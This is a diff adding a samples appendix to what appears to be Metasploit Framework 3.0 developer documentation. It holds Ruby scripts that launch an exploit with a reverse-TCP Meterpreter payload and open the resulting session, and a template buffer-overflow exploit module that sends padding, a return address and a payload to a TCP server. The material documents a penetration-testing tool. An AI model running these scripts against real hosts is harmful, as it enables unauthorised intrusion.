@@ -3091,15 +3091,532 @@ otherwise altered in the future.
 
 \appendix
 \chapter{Samples}
-    \section{Framework Core}
-    \section{Framework Base}
+
+\par
+This chapter contains various samples that illustrate how the
+framework and other libraries can be interacted with to perform
+various tasks.  The source code to these samples can be found in the
+documentation directory that is included with all releases of the
+3.0 version of the framework.
+
+    \section{Framework}
+
+\par
+This section contains samples specific to interacting with the
+framework itself.
+
+        \subsection{Dumping module info}
+
+\par
+This sample demonstrates how a module's information can be easily
+serialized to a readable format.
+
+\footnotesize{
+\begin{verbatim}
+#!/usr/bin/ruby
+
+$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..',
+   'lib'))
+
+require 'msf/base'
+
+if (ARGV.empty?)
+   puts "Usage: #{File.basename(__FILE__)} module_name"
+   exit
+end
+
+framework = Msf::Simple::Framework.create
+
+begin
+   # Create the module instance.
+   mod = framework.modules.create(ARGV.shift)
+
+   # Dump the module's information in readable text format.
+   puts Msf::Serializer::ReadableText.dump_module(mod)
+rescue
+   puts "Error: #{$!}\n\n#{$@.join("\n")}"
+end
+\end{verbatim}}
+
+        \subsection{Encoding the contents of a file}
+
+\par
+This sample demonstrates how a file can be encoded using a framework
+encoder.
+
+\footnotesize{
+\begin{verbatim}
+#!/usr/bin/ruby
+
+$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..',
+   'lib'))
+
+require 'msf/base'
+
+if (ARGV.empty?)
+   puts "Usage: #{File.basename(__FILE__)} encoder_name file_name format"
+   exit
+end
+
+framework = Msf::Simple::Framework.create
+
+begin
+   # Create the encoder instance.
+   mod = framework.encoders.create(ARGV.shift)
+
+   puts(Msf::Simple::Buffer.transform(
+      mod.encode(IO.readlines(ARGV.shift).join), ARGV.shift || 'ruby'))
+rescue
+   puts "Error: #{$!}\n\n#{$@.join("\n")}"
+end
+\end{verbatim}}
+
+        \subsection{Enumerating modules}
+
+\par
+This sample demonstrates enumerating all of the modules in the
+framework and displays their module type and reference name.
+
+\footnotesize{
+\begin{verbatim}
+#!/usr/bin/ruby
+
+$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..',
+  'lib'))
+
+require 'msf/base'
+
+framework = Msf::Simple::Framework.create
+
+# Enumerate each module in the framework.
+framework.modules.each_module { |name, mod|
+   puts "#{mod.type}: #{name}"
+}
+\end{verbatim}}
+
+        \subsection{Running an exploit using framework base}
+
+\par
+This sample demonstrates using the framework core directly to
+launch an exploit.  It makes use of the simplified exploit wrapper
+method provided by the Msf::Simple::Exploit mixin.
+
+\footnotesize{
+\begin{verbatim}
+#!/usr/bin/ruby
+
+$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..',
+   'lib'))
+
+require 'msf/base'
+
+if (ARGV.length == 0)
+   puts "Usage: #{File.basename(__FILE__)} exploit_name payload_name OPTIONS"
+   exit
+end
+
+framework    = Msf::Simple::Framework.create exploit_name =
+ARGV.shift || 'test/multi/aggressive' payload_name = ARGV.shift ||
+'windows/meterpreter/reverse_tcp' input        =
+Rex::Ui::Text::Input::Stdio.new output       =
+Rex::Ui::Text::Output::Stdio.new
+
+begin
+   # Initialize the exploit instance
+   exploit = framework.exploits.create(exploit_name)
+
+   # Fire it off.
+   session = exploit.exploit_simple(
+      'Payload'     => payload_name,
+      'OptionStr'   => ARGV.join(' '),
+      'LocalInput'  => input,
+      'LocalOutput' => output)
+
+   # If a session came back, try to interact with it.
+   if (session)
+      output.print_status("Session #{session.sid} created, interacting...")
+      output.print_line
+
+      session.init_ui(input, output)
+
+      session.interact
+   else
+      output.print_line("Exploit completed, no session was created.")
+   end
+
+rescue
+   output.print_error("Error: #{$!}\n\n#{$@.join("\n")}")
+end
+\end{verbatim}}
+
+
+        \subsection{Running an exploit using framework core}
+
+\par
+This sample demonstrates using the framework core directly to launch
+an exploit.  It uses the framework base Framework class so that the
+distribution module path is automatically set, but relies strictly
+on framework core classes for everything else.
+
+\footnotesize{
+\begin{verbatim}
+#!/usr/bin/ruby
+
+$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..',
+   'lib'))
+
+require 'msf/base'
+
+if (ARGV.length == 0)
+   puts "Usage: #{File.basename(__FILE__)} exploit_name payload_name OPTIONS"
+   exit
+end
+
+framework    = Msf::Simple::Framework.create
+exploit_name = ARGV.shift || 'test/multi/aggressive'
+payload_name = ARGV.shift || 'windows/meterpreter/reverse_tcp'
+input        = Rex::Ui::Text::Input::Stdio.new
+output       = Rex::Ui::Text::Output::Stdio.new
+
+begin
+   # Create the exploit driver instance.
+   driver = Msf::ExploitDriver.new(framework)
+
+   # Initialize the exploit driver's exploit and payload instance
+   driver.exploit = framework.exploits.create(exploit_name)
+   driver.payload = framework.payloads.create(payload_name)
+
+   # Import options specified in VAR=VAL format from the supplied command
+   # line.
+   driver.exploit.datastore.import_options_from_s(ARGV.join(' '))
+
+   # Share the exploit's datastore with the payload.
+   driver.payload.share_datastore(driver.exploit.datastore)
+
+   # Initialize the target index to what's in the exploit's data store or
+   # zero by default.
+   driver.target_idx = (driver.exploit.datastore['TARGET'] || 0).to_i
+
+   # Initialize the exploit and payload user interfaces.
+   driver.exploit.init_ui(input, output)
+   driver.payload.init_ui(input, output)
+
+   # Fire it off.
+   session = driver.run
+
+   # If a session came back, try to interact with it.
+   if (session)
+      output.print_status("Session #{session.sid} created, interacting...")
+      output.print_line
+
+      session.init_ui(input, output)
+
+      session.interact
+   else
+      output.print_line("Exploit completed, no session was created.")
+   end
+
+rescue
+   output.print_error("Error: #{$!}\n\n#{$@.join("\n")}")
+end
+\end{verbatim}}
+
     \section{Framework Module}
+
+\par
+This section shows some sample framework modules.
+
         \subsection{Encoder}
+
+\par
+This sample illustrates a very basic encoder that simply returns the
+block that it's passed.
+
+\footnotesize{
+\begin{verbatim}
+module Msf
+module Encoders
+
+class Sample < Msf::Encoder
+
+   def initialize
+      super(
+         'Name'             => 'Sample encoder',
+         'Version'          => '$Revision$',
+         'Description'      => %q{
+            Sample encoder that just returns the block it's passed
+            when encoding occurs.
+         },
+         'Author'           => 'skape',
+         'Arch'             => ARCH_ALL)
+   end
+
+   #
+   # Returns the unmodified buffer to the caller.
+   #
+   def encode_block(state, buf)
+      buf
+   end
+
+end
+
+end
+end
+\end{verbatim}}
+
         \subsection{Exploit}
+
+\par
+This exploit sample shows how an exploit module could be written to
+exploit a bug in an arbitrary TCP server.
+
+\footnotesize{
+\begin{verbatim}
+module Msf
+
+class Exploits::Sample < Msf::Exploit::Remote
+
+   #
+   # This exploit affects TCP servers, so we use the TCP client mixin.
+   #
+   include Exploit::Remote::Tcp
+
+   def initialize(info = {})
+      super(update_info(info,
+         'Name'           => 'Sample exploit',
+         'Description'    => %q{
+            This exploit module illustrates how a vulnerability could be exploited
+            in an TCP server that has a parsing bug.
+         },
+         'Author'         => 'skape',
+         'Version'        => '$Revision$',
+         'Payload'        =>
+            {
+               'Space'    => 1000,
+               'BadChars' => "\x00",
+            },
+         'Targets'        =>
+            [
+               # Target 0: Windows All
+               [
+                  'Windows Universal',
+                  {
+                     'Platform' => 'win',
+                     'Ret'      => 0x41424344
+                  }
+               ],
+            ],
+         'DefaultTarget' => 0))
+   end
+
+   #
+   # The sample exploit just indicates that the remote host is always
+   # vulnerable.
+   #
+   def check
+      return Exploit::CheckCode::Vulnerable
+   end
+
+   #
+   # The exploit method connects to the remote service and sends 1024 A's
+   # followed by the fake return address and then the payload.
+   #
+   def exploit
+      connect
+
+      print_status("Sending #{payload.encoded.length} byte payload...")
+
+      # Build the buffer for transmission
+      buf  = "A" * 1024
+      buf += [ target.ret ].pack('V')
+      buf += payload.encoded
+
+      # Send it off
+      sock.put(buf)
+      sock.get
+
+      handler
+   end
+
+end
+
+end
+\end{verbatim}}
+
         \subsection{Nop}
+
+\par
+This class implements a very basic NOP sled generator that just
+returns a string of 0x90's for the supplied sled length.
+
+\footnotesize{
+\begin{verbatim}
+module Msf
+module Nops
+
+class Sample < Msf::Nop
+
+   def initialize
+      super(
+         'Name'        => 'Sample NOP generator',
+         'Version'     => '$Revision$',
+         'Description' => 'Sample single-byte NOP generator',
+         'Author'      => 'skape',
+         'Arch'        => ARCH_X86)
+   end
+
+   #
+   # Returns a string of 0x90's for the supplied length.
+   #
+   def generate_sled(length, opts)
+      "\x90" * length
+   end
+
+end
+
+end
+end
+\end{verbatim}}
+
         \subsection{Payload}
+
+\par
+This sample payload is designed to trigger a debugger exception via
+int3.
+
+\footnotesize{
+\begin{verbatim}
+module Msf
+module Payloads
+module Singles
+
+module Sample
+
+   include Msf::Payload::Single
+
+   def initialize(info = {})
+      super(update_info(info,
+         'Name'          => 'Debugger Trap',
+         'Version'       => '$Revision$',
+         'Description'   => 'Causes a debugger trap exception through int3',
+         'Author'        => 'skape',
+         'Platform'      => 'win',
+         'Arch'          => ARCH_X86,
+         'Payload'       =>
+            {
+               'Payload' => "\xcc"
+            }
+         ))
+   end
+
+end
+
+end
+end
+end
+\end{verbatim}}
+
         \subsection{Recon}
+
+\par
+Reconnaissance modules are undergoing design review and do not have
+any samples available at this time.
+
     \section{Framework Plugin}
-    \section{Extended Tools}
+
+        \subsection{Console user interface plugin}
+
+\par
+This class illustrates a sample plugin.  Plugins can change the
+behavior of the framework by adding new features, new user interface
+commands, or through any other arbitrary means.  They are designed
+to have a very loose definition in order to make them as useful as
+possible.
+
+\footnotesize{
+\begin{verbatim}
+module Msf
+
+class Plugin::Sample < Msf::Plugin
+
+   ###
+   #
+   # This class implements a sample console command dispatcher.
+   #
+   ###
+   class ConsoleCommandDispatcher
+      include Msf::Ui::Console::CommandDispatcher
+
+      #
+      # The dispatcher's name.
+      #
+      def name
+         "Sample"
+      end
+
+      #
+      # Returns the hash of commands supported by this dispatcher.
+      #
+      def commands
+         {
+            "sample" => "A sample command added by the sample plugin"
+         }
+      end
+
+      #
+      # This method handles the sample command.
+      #
+      def cmd_sample(*args)
+         print_line("You passed: #{args.join(' ')}")
+      end
+   end
+
+   #
+   # The constructor is called when an instance of the plugin is created.  The
+   # framework instance that the plugin is being associated with is passed in
+   # the framework parameter.  Plugins should call the parent constructor when
+   # inheriting from Msf::Plugin to ensure that the framework attribute on
+   # their instance gets set.
+   #
+   def initialize(framework, opts)
+      super
+
+      # If this plugin is being loaded in the context of a console application
+      # that uses the framework's console user interface driver, register
+      # console dispatcher commands.
+      add_console_dispatcher(ConsoleCommandDispatcher)
+
+      print_status("Sample plugin loaded.")
+   end
+
+   #
+   # The cleanup routine for plugins gives them a chance to undo any actions
+   # they may have done to the framework.  For instance, if a console
+   # dispatcher was added, then it should be removed in the cleanup routine.
+   #
+   def cleanup
+      # If we had previously registered a console dispatcher with the console,
+      # deregister it now.
+      remove_console_dispatcher('Sample')
+   end
+
+   #
+   # This method returns a short, friendly name for the plugin.
+   #
+   def name
+      "sample"
+   end
+
+   #
+   # This method returns a brief description of the plugin.  It should be no
+   # more than 60 characters, but there are no hard limits.
+   #
+   def desc
+      "Demonstrates using framework plugins"
+   end
+
+end
+end
+\end{verbatim}
 
 \end{document}
